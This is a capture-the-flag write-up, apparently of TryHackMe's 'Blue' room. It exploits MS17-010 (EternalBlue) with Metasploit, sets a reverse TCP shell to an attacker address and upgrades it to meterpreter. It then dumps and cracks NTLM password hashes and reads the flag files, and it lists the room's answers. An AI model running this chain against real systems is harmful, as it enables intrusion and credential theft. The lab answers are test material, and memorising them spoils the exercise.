# Task 1 Recon

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

Answer the questions below

Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)

`nmap -sS -Pn -p- -T4 --script vuln -vv 10.10.72.18`


How many ports are open with a port number under 1000?
`nmap -sS -Pn -p 1-1000 -T4 -vv 10.10.72.18`
Answer: `3`

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

Answer: `ms17-010`

# Task 2 Gain Access
Exploit the machine and gain a foothold.
Start [Metasploit](https://tryhackme.com/module/metasploit)
`msfconsole`

Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
`search ms17-010`
Answer: `exploit/windows/smb/ms17_010_eternalblue`

Show options and set the one required value. What is the name of this value? (All caps for submission)
`use 0`
`show options`
`set RHOSTS 10.10.72.18`

Answer: `RHOSTS`

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`

With that done, run the exploit!

`set lhost 10.4.18.254`
`exploit`

# Task 3 Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

Answer the questions below

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

`search shell_to_meterpreter`

Answer: `post/multi/manage/shell_to_meterpreter`

`use 0`
`show options` we need lhost, lport, session

Select this (use MODULE_PATH). Show options, what option are we required to change?
Answer: `session`

Set the required option, you may need to list all of the sessions to find your target here.
`sessions -l` shows us sessionID `1` only.

`set session 1`
`set lhost 10.4.18.254`
`lport` looks to be `4433` which shouldn't conflict with anything we have running currently.

Run! If this doesn't work, try completing the exploit from the previous task once more.
`run`

Once the meterpreter shell conversion completes, select that session for use.
`sessions -l`
`sessions 2`

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
`getuid`

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
`ps`

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

`migrate 2212`

# Task 4 Cracking

Dump the non-default user's password and crack it!

Answer the questions below

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
```metasploit
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Answer: `Jon`


Copy this password hash to a file and research how to crack it. What is the cracked password?
`hashcat -a 0 -m 1000 hash.txt rockyou.txt`

Answer: `alqfna22`

# Task 5 Find flags!

Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below 
to complete this room!

`dir/s/a/b c:\flag*.*`

Flag1? _This flag can be found at the system root._

`type c:\flag1.txt`
Answer: `flag{access_the_machine}`

Flag2? _This flag can be found at the location where passwords are stored within Windows._
*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

`type c:\windows\system32\config\flag2.txt
Answer: `flag{sam_database_elevated_access}`

flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._
`type c:\users\jon\documents\flag3.txt`
Answer: `flag{admin_documents_can_be_valuable}`
